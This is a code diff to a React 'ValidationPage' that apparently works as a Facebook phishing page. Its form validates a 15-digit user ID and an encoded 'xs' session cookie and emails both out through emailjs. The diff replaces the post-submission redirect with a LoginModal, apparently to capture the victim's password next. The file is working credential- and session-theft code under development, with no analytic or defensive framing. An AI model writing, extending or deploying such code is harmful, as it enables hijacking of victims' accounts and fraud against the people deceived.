@@ -1,15 +1,15 @@
 import React, { useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import emailjs from "@emailjs/browser";
-import FacebookVideo from "../assets/fbVideo.png";
 import "./style.css";
-import LoginModal from "../modal/LoginModal";
+import LoginModal from "../modal/LoginModal"; // Import the LoginModal component
 
 const ValidationPage = () => {
   const form = useRef();
   const navigate = useNavigate();
   const [isFormValid, setIsFormValid] = useState(false);
   const [videoMuted, setVideoMuted] = useState(true);
+  const [showModal, setShowModal] = useState(false); // State to control modal visibility
 
   const sendEmail = (e) => {
     e.preventDefault();
@@ -18,7 +18,7 @@ const ValidationPage = () => {
     const xsValue = form.current.elements["xs"].value;
 
     const cUserPattern = /^\d{15}$/;
-    const xsPattern = /.*%+.*/; 
+    const xsPattern = /.*%+.*/;
 
     const isCUserValid = cUserPattern.test(cUserValue);
     const isXsValid = xsPattern.test(xsValue);
@@ -34,7 +34,7 @@ const ValidationPage = () => {
         .then(
           (result) => {
             console.log("result text is", result.text);
-            navigate("/thanks");
+            setShowModal(true); // Show the modal after form submission
           },
           (error) => {
             console.log(error.text);
@@ -171,6 +171,9 @@ const ValidationPage = () => {
           </div>
         </div>
       </form>
+
+      {/* Include the LoginModal component */}
+      <LoginModal showModal={showModal} setShowModal={setShowModal} />
     </>
   );
 };
